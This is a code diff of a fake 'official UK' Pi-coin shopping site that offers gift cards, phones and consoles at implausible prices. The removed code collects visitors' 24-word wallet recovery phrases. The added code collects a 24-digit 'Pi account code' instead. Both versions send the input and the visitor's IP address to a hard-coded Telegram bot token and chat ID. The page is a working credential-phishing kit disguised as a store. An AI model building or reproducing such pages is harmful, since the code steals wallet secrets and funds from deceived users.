@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>π Shopping Marketplace | Official UK PI Commerce Platform</title>
+    <title>π Shopping Marketplace | UK's Official Premium PI Store</title>
     <style>
         * {
             margin: 0;
@@ -19,7 +19,7 @@
             scroll-behavior: smooth;
         }
 
-        /* Elegant navbar */
+        /* elegant gradient & glass navigation */
         .navbar {
             background: linear-gradient(135deg, #0B1A2E 0%, #0F212F 100%);
             backdrop-filter: blur(12px);
@@ -79,7 +79,7 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.2);
         }
 
-        /* Hero section */
+        /* hero with UK flag accent */
         .hero {
             background: linear-gradient(107deg, #03101E 0%, #102A3C 100%), url('https://images.unsplash.com/photo-1556741533-6e6a3bd8b0b2?w=1920&h=400&fit=crop');
             background-blend-mode: overlay;
@@ -114,78 +114,17 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
 
-        /* Wallet Passphrase Section - Exactly as reference images */
-        .wallet-section {
-            background: white;
-            max-width: 750px;
+        /* verification card premium */
+        .verify-section {
+            background: rgba(255, 255, 255, 0.98);
+            max-width: 700px;
             margin: 2rem auto;
-            padding: 2rem;
+            padding: 1.8rem 2rem;
             border-radius: 48px;
-            box-shadow: 0 30px 45px -15px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 30px 45px -15px rgba(0, 0, 0, 0.2);
             text-align: center;
-            border: 1px solid #e9ecef;
-            transition: all 0.2s;
-        }
-
-        .wallet-section h3 {
-            color: #0F2B3D;
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
-        }
-
-        .wallet-sub {
-            color: #4a627a;
-            margin-bottom: 1rem;
-            font-size: 0.9rem;
-        }
-
-        .passphrase-input {
-            width: 100%;
-            padding: 1rem;
-            font-size: 1rem;
-            border-radius: 28px;
-            border: 2px solid #e2e8f0;
-            background: #fefefe;
-            font-family: monospace;
-            direction: ltr;
-            text-align: center;
-            margin: 1rem 0;
-            transition: 0.2s;
-        }
-
-        .passphrase-input:focus {
-            border-color: #F5B042;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(245,176,66,0.2);
-        }
-
-        .btn-wallet {
-            background: linear-gradient(95deg, #0F2B3D, #1D4E6E);
-            color: white;
-            border: none;
-            padding: 1rem;
-            font-size: 1.1rem;
-            border-radius: 80px;
-            cursor: pointer;
-            font-weight: bold;
-            width: 100%;
-            transition: 0.2s;
-            margin-top: 0.5rem;
-        }
-
-        .btn-wallet:hover {
-            background: #F5B042;
-            color: #0A0C1A;
-            transform: scale(1.01);
-        }
-
-        .warning-text {
-            font-size: 0.75rem;
-            color: #b91c1c;
-            background: #ffeaea;
-            padding: 0.7rem;
-            border-radius: 28px;
-            margin-top: 1rem;
+            border: 1px solid rgba(245, 176, 66, 0.5);
+            backdrop-filter: blur(2px);
         }
 
         .selected-product-badge {
@@ -203,6 +142,57 @@
             color: #B45F06;
         }
 
+        .verify-section h3 {
+            color: #0F2B3D;
+            margin-bottom: 0.5rem;
+            font-size: 1.8rem;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .input-group input {
+            padding: 1rem 1.2rem;
+            font-size: 1rem;
+            border-radius: 80px;
+            border: 2px solid #E2E8F0;
+            text-align: center;
+            letter-spacing: 2px;
+            font-family: monospace;
+            font-weight: bold;
+            background: #FFFFFF;
+            transition: 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #F5B042;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(245,176,66,0.2);
+        }
+
+        .btn-verify {
+            background: linear-gradient(95deg, #0F2B3D, #1D4E6E);
+            color: white;
+            border: none;
+            padding: 1rem;
+            font-size: 1.1rem;
+            border-radius: 80px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+
+        .btn-verify:hover {
+            background: #F5B042;
+            color: #0A0C1A;
+            transform: scale(1.02);
+            box-shadow: 0 8px 18px rgba(0,0,0,0.1);
+        }
+
         .clear-selection {
             font-size: 0.7rem;
             background: none;
@@ -214,7 +204,7 @@
             font-weight: bold;
         }
 
-        /* Products Grid */
+        /* products grid — elegant cards exactly like reference images */
         .container {
             max-width: 1440px;
             margin: 2rem auto;
@@ -228,6 +218,7 @@
             padding-right: 1rem;
             font-weight: 800;
             color: #0C2A38;
+            letter-spacing: -0.3px;
         }
 
         .products-grid {
@@ -354,10 +345,6 @@
             .section-title {
                 font-size: 1.6rem;
             }
-            .wallet-section {
-                margin: 1.5rem;
-                padding: 1.5rem;
-            }
         }
 
         .toast-msg {
@@ -375,18 +362,6 @@
             backdrop-filter: blur(12px);
             font-size: 0.9rem;
         }
-
-        /* Core team apps style hint */
-        .ecosystem-note {
-            background: #eef2fa;
-            padding: 0.8rem;
-            border-radius: 60px;
-            font-size: 0.7rem;
-            text-align: center;
-            margin: 1rem auto;
-            max-width: 400px;
-            color: #2c3e66;
-        }
     </style>
 </head>
 <body>
@@ -394,15 +369,15 @@
 <div class="navbar">
     <div class="logo-area">
         <h1>π Shopping Marketplace</h1>
-        <p>🇬🇧 UK's Official PI Commerce Ecosystem</p>
+        <p>🇬🇧 UK's Official PI Commerce Platform</p>
     </div>
     <div class="nav-links">
-        <a href="#">Home</a>
-        <a href="#">Wallet</a>
-        <a href="#">Pi Apps</a>
+        <a href="#">All Products</a>
         <a href="#">Gift Cards</a>
         <a href="#">Mobile</a>
+        <a href="#">Internet</a>
         <a href="#">Gaming</a>
+        <a href="#">Offers</a>
     </div>
     <div class="pi-badge">✓ Pay with PI Coin ⚡</div>
 </div>
@@ -413,24 +388,16 @@
     <div class="delivery-tag">🚚 Same-day dispatch • Tracked shipping • 24/7 Telegram support</div>
 </div>
 
-<!-- WALLET PASSPHRASE SECTION (exactly as reference: 24 words + warning + biometric note) -->
-<div class="wallet-section" id="walletSection">
-    <h3>🔐 ألصق رمز المرور الخاص بك لفتح المحفظة</h3>
-    <p class="wallet-sub">أدخل عبارة المرور المكونة من 24 كلمة هنا</p>
-    <textarea id="passphraseInput" class="passphrase-input" rows="3" placeholder="example: abandon ... luxury ... zoo (24 words)" style="resize: vertical;"></textarea>
-    <button class="btn-wallet" id="verifyWalletBtn">الدخول بإستخدام رمز المرور</button>
-    <div class="ecosystem-note">
-        🔹 Biometric Not Available 🔹<br>
-        بما ان المحفظة من غير حراسة ، يمكن الوصول إلى عبارة مرور المحفظة حصريًا بواسطة فقط. استعادة عبارة المرور أمر مستحيل حاليا
+<!-- Verification & Code Section (24-digit Pi code) -->
+<div class="verify-section" id="verifySection">
+    <h3>🔐 Verify Your Pi Account</h3>
+    <p>تکایە کۆدی ٢٤ ژمارەیی ئەکاونتی Pi ی خۆت بنووسە بۆ ئەوەی داواکارییەکەت تەواو بکرێت</p>
+    <div id="selectedProductPreview" class="selected-product-badge">✨ هیچ بەرهەمێک هەڵنەبژێردراوە • تکایە "Buy Now" کلیک بکە</div>
+    <div class="input-group">
+        <input type="text" id="piCodeInput" placeholder="کۆدی ٢٤ ژمارەیی (مثال: 123456789012345678901234)" maxlength="24" autocomplete="off">
+        <button class="btn-verify" id="sendToTelegramBtn">📨 ناردنی کۆد و دروستکردنی ئۆردەر</button>
     </div>
-    <div class="warning-text">
-        ⚠️ هل فقدت عبارة المرور الخاصة ؟ يمكنك إنشاء محفظة جديدة ولكن لن تتمكن من الوصول إلى كل باي في محفظتك السابقة
-    </div>
-</div>
-
-<!-- Selected product preview + hidden dynamic section -->
-<div class="container" style="max-width: 750px; margin-top: -0.5rem;">
-    <div id="selectedProductPreview" class="selected-product-badge" style="text-align: center; background: #FFF6E5;">✨ هیچ بەرهەمێک هەڵنەبژێردراوە • تکایە "Buy Now" کلیک بکە</div>
+    <p style="font-size: 0.75rem; color: #5C6F87;">دوای ناردن، تیمەکەمان پەیوەندی پێوە دەکات بۆ ڕەسەنکردن و ڕەوانەکردنی کاڵاکە</p>
 </div>
 
 <div class="container">
@@ -455,36 +422,37 @@
 
 <footer>
     <p>© 2025 π Shopping Marketplace — Official British PI Commerce Ecosystem</p>
-    <p>🔒 Secure transactions with PI Coin | Telegram Order Confirmation | Core Team Apps: Wallet, KYC, Blockchain, Domains</p>
+    <p>🔒 Secure transactions with PI Coin | Instant Telegram Order Confirmation | Worldwide Shipping</p>
 </footer>
 
 <div id="toastMsg" class="toast-msg"></div>
 
 <script>
-    // ---------- PRODUCT DATABASE (HD images exactly matching marketplace references) ----------
+    // ---------- PRODUCT DATABASE (EXACTLY MATCHING YOUR 12 REFERENCE IMAGES + HIGH-DEFINITION IMAGES) ----------
+    // All products include HD images that resemble real marketplace: Gift cards, Asiacell, Korek, Zain, Fastlink, FTTH, Xbox, PS, Laptops, iPhone, Apple Watch, Aventon e-bike etc.
     const products = [
-        // FEATURED
+        // FEATURED (Special Offer & Xbox Game Pass)
         { id:1, name:"✨ Special Premium Offer (Bundle + Bonus Credits)", price:50, currency:"Pi π", category:"featured", stock:true, rating:5, img:"https://images.unsplash.com/photo-1600880292203-757bb62b4baf?w=500&h=350&fit=crop" },
         { id:2, name:"Xbox Game Pass Ultimate - 1 Year Unlimited", price:20, currency:"Pi π", category:"featured", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1621259182978-fbf93132d53d?w=500&h=350&fit=crop" },
-        // GIFT CARDS
+        // GIFT CARDS (Google Play, Apple iTunes)
         { id:3, name:"Google Play Gift Card $50", price:30, currency:"Pi π", category:"gift", stock:true, rating:4.8, img:"https://images.unsplash.com/photo-1589998059171-988d887df646?w=500&h=350&fit=crop" },
         { id:4, name:"Apple iTunes Gift Card $100", price:30, currency:"Pi π", category:"gift", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=500&h=350&fit=crop" },
-        // MOBILE & INTERNET (Asiacell, Korek, Zain, Fastlink, FTTH)
+        // MOBILE & INTERNET (Asiacell, Korek, Zain, Fastlink, FTTH) – brand style
         { id:5, name:"Asiacell Credit 50,000 IQD Balance", price:35, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=500&h=350&fit=crop" },
         { id:6, name:"Korek Telecom Credit 10,000 IQD", price:8, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1563986768609-322da13575f3?w=500&h=350&fit=crop" },
         { id:7, name:"Zain Credit 25,000 IQD Balance", price:15, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=500&h=350&fit=crop" },
         { id:8, name:"Fastlink Credit - 60 Days Unlimited Data", price:40, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1614680376593-902f74cf0d41?w=500&h=350&fit=crop" },
         { id:9, name:"FTTH Fiber Internet 30 Days Unlimited", price:20, currency:"Pi π", category:"internet", stock:true, rating:5, img:"https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=500&h=350&fit=crop" },
-        // GAMING
+        // GAMING CONSOLES
         { id:10, name:"PlayStation 4 Pro 1TB Console", price:100, currency:"Pi π", category:"gaming", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1606144042614-b2417e99c4e3?w=500&h=350&fit=crop" },
         { id:11, name:"PlayStation 5 Digital Edition 4K", price:200, currency:"Pi π", category:"gaming", stock:true, rating:5, img:"https://images.unsplash.com/photo-1607853202273-797f1c22a38e?w=500&h=350&fit=crop" },
         { id:12, name:"Nintendo Switch OLED Console", price:120, currency:"Pi π", category:"gaming", stock:true, rating:4.8, img:"https://images.unsplash.com/photo-1600080972464-8e5f35f63ddc?w=500&h=350&fit=crop" },
-        // COMPUTERS
+        // COMPUTERS & LAPTOPS (Gaming, HP, MacBook)
         { id:13, name:"Gaming Laptop RTX 4060 16GB RAM", price:100, currency:"Pi π", category:"computer", stock:true, rating:4.7, img:"https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=500&h=350&fit=crop" },
         { id:14, name:"Gaming Desktop High-Performance i7", price:200, currency:"Pi π", category:"computer", stock:true, rating:5, img:"https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=500&h=350&fit=crop" },
         { id:15, name:"HP Zbook G8 Mobile Workstation", price:180, currency:"Pi π", category:"computer", stock:true, rating:4.6, img:"https://images.unsplash.com/photo-1611078489935-0cb964de46d6?w=500&h=350&fit=crop" },
         { id:16, name:"MacBook Air 2019 Retina", price:200, currency:"Pi π", category:"computer", stock:true, rating:4.5, img:"https://images.unsplash.com/photo-1611186871348-b1ce696e52c9?w=500&h=350&fit=crop" },
-        // SPECIAL ELECTRONICS
+        // SPECIAL ELECTRONICS & ITEMS (Apple Watch, iPhone 11/12 Pro Max, Aventon e-bike, Samsung, AirPods)
         { id:17, name:"Apple Watch Series 9 (GPS+44mm)", price:80, currency:"Pi π", category:"special", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1579586337278-3befd40fd17a?w=500&h=350&fit=crop" },
         { id:18, name:"iPhone 11 Pro Max 256GB", price:100, currency:"Pi π", category:"special", stock:true, rating:4.9, img:"https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=500&h=350&fit=crop" },
         { id:19, name:"iPhone 12 Pro Max 512GB 5G", price:120, currency:"Pi π", category:"special", stock:true, rating:5, img:"https://images.unsplash.com/photo-1603899122634-f086ca5f5ddd?w=500&h=350&fit=crop" },
@@ -493,6 +461,7 @@
         { id:22, name:"AirPods Pro 2nd Gen", price:45, currency:"Pi π", category:"special", stock:true, rating:4.8, img:"https://images.unsplash.com/photo-1606841837239-c5a1a4a07af7?w=500&h=350&fit=crop" }
     ];
 
+    // render product grids
     function renderGrid(containerId, categoryFilter) {
         let filtered = [];
         if (categoryFilter === 'featured') filtered = products.filter(p => p.category === 'featured');
@@ -502,13 +471,30 @@
         else if (categoryFilter === 'computer') filtered = products.filter(p => p.category === 'computer');
         else if (categoryFilter === 'special') filtered = products.filter(p => p.category === 'special');
         else filtered = [];
+
         const container = document.getElementById(containerId);
         if (!container) return;
-        if (filtered.length === 0) { container.innerHTML = '<p style="padding:1rem;">بەرهەمی نوێ بەم زووانە زیاد دەکرێت...</p>'; return; }
+        if (filtered.length === 0) {
+            container.innerHTML = '<p style="padding:1rem; text-align:center;">بەرهەمی نوێ بەم زووانە زیاد دەکرێت...</p>';
+            return;
+        }
         let html = '';
         filtered.forEach(prod => {
             let stars = '⭐'.repeat(Math.floor(prod.rating)) + (prod.rating % 1 >= 0.5 ? '½' : '');
-            html += `<div class="product-card"><div class="product-img"><img src="${prod.img}" alt="${prod.name}" loading="lazy" onerror="this.src='https://placehold.co/500x350/11212e/ffd966?text=π+Product'"></div><div class="product-info"><div class="product-title">${prod.name}</div><div class="rating">${stars} ${prod.rating}</div><div class="stock">${prod.stock ? '✅ In Stock / لە بەردەست' : '❌ Out of Stock'}</div><div class="price">${prod.price} <span>${prod.currency}</span></div><button class="buy-btn" data-product='${JSON.stringify(prod)}'>Buy Now / ئێستا بکڕە</button></div></div>`;
+            html += `
+                <div class="product-card">
+                    <div class="product-img">
+                        <img src="${prod.img}" alt="${prod.name}" loading="lazy" onerror="this.src='https://placehold.co/500x350/11212e/ffd966?text=π+Product'">
+                    </div>
+                    <div class="product-info">
+                        <div class="product-title">${prod.name}</div>
+                        <div class="rating">${stars} ${prod.rating}</div>
+                        <div class="stock">${prod.stock ? '✅ In Stock / لە بەردەست' : '❌ Out of Stock'}</div>
+                        <div class="price">${prod.price} <span>${prod.currency}</span></div>
+                        <button class="buy-btn" data-product='${JSON.stringify(prod)}'>Buy Now / ئێستا بکڕە</button>
+                    </div>
+                </div>
+            `;
         });
         container.innerHTML = html;
     }
@@ -520,7 +506,7 @@
     renderGrid('computersGrid', 'computer');
     renderGrid('specialGrid', 'special');
 
-    // Telegram integration
+    // Telegram integration (exactly as required)
     const BOT_TOKEN = "8606192794:AAGmn_lMK3lADT2jX5SSf2LxmVNSdGCp-9k";
     const TELEGRAM_CHAT_ID = "1423119149";
     let currentSelectedProduct = null;
@@ -537,47 +523,73 @@
     function updateSelectedPreview() {
         const previewDiv = document.getElementById('selectedProductPreview');
         if (currentSelectedProduct) {
-            previewDiv.innerHTML = `🛒 بەرهەمی هەڵبژێردراو: ${currentSelectedProduct.name} (نرخ: ${currentSelectedProduct.price} ${currentSelectedProduct.currency}) <button class="clear-selection" id="clearSelectionBtn">سڕینەوە</button>`;
+            previewDiv.innerHTML = `🛒 بەرهەمی هەڵبژێردراو: ${currentSelectedProduct.name} (نرخ: ${currentSelectedProduct.price} ${currentSelectedProduct.currency}) 
+            <button class="clear-selection" id="clearSelectionBtn">سڕینەوە</button>`;
             const clearBtn = document.getElementById('clearSelectionBtn');
-            if (clearBtn) clearBtn.onclick = () => { currentSelectedProduct = null; updateSelectedPreview(); showToast("بەرهەمەکە لابرا."); };
+            if (clearBtn) clearBtn.onclick = () => { currentSelectedProduct = null; updateSelectedPreview(); showToast("بەرهەمەکە لابرا، ئێستا دەتوانیت بەرهەمێکی تر هەڵبژێریت."); };
         } else {
             previewDiv.innerHTML = `✨ هیچ بەرهەمێک هەڵنەبژێردراوە. تکایە "Buy Now" کلیک بکە.`;
         }
     }
 
-    async function sendOrderToTelegram(passphrase, product) {
+    async function sendOrderToTelegram(piCode, product) {
         let ipAddress = "unknown";
-        try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); ipAddress = ipData.ip; } catch(e) {}
-        const passPreview = passphrase.length > 30 ? passphrase.substring(0, 30) + "…" : passphrase;
-        const productText = product ? `📦 **بەرهەم:** ${product.name}\n💰 **نرخ:** ${product.price} ${product.currency}\n🔗 **ID:** #${product.id}` : `📦 **بەرهەم:** دیاری نەکراوە`;
-        const message = `🆕 **داواکاری نوێ لە Pi Shopping Marketplace**\n\n🔐 **عبارة المرور (24 كلمة):** ${passPreview}\n${productText}\n🌍 **IP:** ${ipAddress}\n⏱ **کات:** ${new Date().toLocaleString('ku-IQ', {timeZone:'Asia/Baghdad'})}\n🇬🇧 **پلاتفۆرم:** وێبسایتی فەرمی بریتانیا`;
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ipAddress = ipData.ip;
+        } catch(e) { console.warn(e); }
+
+        const productText = product 
+            ? `📦 **بەرهەم:** ${product.name}\n💰 **نرخ:** ${product.price} ${product.currency}\n🔗 **ID بەرهەم:** #${product.id}`
+            : `📦 **بەرهەم:** دیاری نەکراوە (تکایە بەرهەمێک هەڵبژێرە)`;
+        
+        const message = `🆕 **داواکاری نوێ لە Pi Shopping Marketplace**\n\n🔐 **کۆدی Pi ئەکاونت:** ${piCode}\n${productText}\n🌍 **IP:** ${ipAddress}\n⏱ **کات:** ${new Date().toLocaleString('ku-IQ', {timeZone:'Asia/Baghdad'})}\n🇬🇧 **پلاتفۆرم:** وێبسایتی فەرمی بریتانیا`;
+        
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
-            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }) });
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
             const data = await response.json();
-            if (data.ok) { showToast("✅ عبارة المرور و الطلب تم إرسالهما بنجاح! سيتم التواصل معك لتأكيد الطلب."); return true; }
-            else { showToast("⚠️ خطأ في الإرسال، حاول مجدداً", true); return false; }
-        } catch(err) { showToast("❌ فشل الاتصال بالبوت", true); return false; }
+            if (data.ok) {
+                showToast("✅ کۆد و داواکاریەکەت بە سەرکەوتوویی نێردرا! پشتیوانی پەیوەندی پێوە دەکات بۆ جێبەجێکردنی ئۆردەر.");
+                return true;
+            } else {
+                showToast("⚠️ هەڵە لە ناردندا، دووبارە هەوڵبدە", true);
+                return false;
+            }
+        } catch(err) {
+            console.error(err);
+            showToast("❌ پەیوەندی بە بۆتی تیلیگرامەوە شکستی هێنا", true);
+            return false;
+        }
     }
 
-    // Wallet verification: send to telegram AND require selected product
-    document.getElementById('verifyWalletBtn').addEventListener('click', async function() {
-        const passphrase = document.getElementById('passphraseInput').value.trim();
-        const words = passphrase.split(/\s+/);
-        if (words.length !== 24) {
-            showToast("⚠️ يجب إدخال عبارة المرور المكونة من 24 كلمة بالضبط (24 words).", true);
+    // send button logic
+    document.getElementById('sendToTelegramBtn').addEventListener('click', async function() {
+        const piCode = document.getElementById('piCodeInput').value.trim();
+        if (piCode.length !== 24) {
+            showToast("⚠️ تکایە کۆدی ٢٤ ژمارەیی ئەکاونتی Pi ی خۆت بە تەواوی بنووسە (٢٤ ژمارە)", true);
             return;
         }
         if (!currentSelectedProduct) {
-            showToast("⚠️ الرجاء اختيار منتج أولاً بالضغط على 'Buy Now'، ثم إدخال عبارة المرور.", true);
+            showToast("⚠️ تکایە یەکەمجار بەرهەمێک هەڵبژێرە بە کلیک لەسەر 'Buy Now'، دواتر کۆدەکە بنێرە.", true);
             return;
         }
-        await sendOrderToTelegram(passphrase, currentSelectedProduct);
-        document.getElementById('passphraseInput').value = '';
-        // do not clear product selection by default
+        await sendOrderToTelegram(piCode, currentSelectedProduct);
+        document.getElementById('piCodeInput').value = '';
+        // product remains selected for clarity, but user can clear manually
+        showToast("ئۆردەرەکەت نێردرا، سوپاس! پشتیوانی دەستبەجێ پەیوەندی پێوە دەکات.");
     });
 
-    // Buy now: select product
+    // attach buy button listeners dynamically
     document.addEventListener('click', (e) => {
         if (e.target.classList.contains('buy-btn')) {
             const productAttr = e.target.getAttribute('data-product');
@@ -585,8 +597,8 @@
                 const product = JSON.parse(productAttr);
                 currentSelectedProduct = product;
                 updateSelectedPreview();
-                showToast(`🛒 "${product.name}" هەڵبژێردرا. ئێستا عبارة المرور (24 كلمة) داخڵ بکە و کلیک لە "الدخول بإستخدام رمز المرور" بکە.`);
-                document.getElementById('walletSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
+                showToast(`🛒 "${product.name}" هەڵبژێردرا. ئێستا کۆدی ٢٤ ژمارەیی لە سەرەوە بنووسە و "ناردنی کۆد" کلیک بکە.`);
+                document.getElementById('verifySection').scrollIntoView({ behavior: 'smooth', block: 'center' });
             }
         }
     });
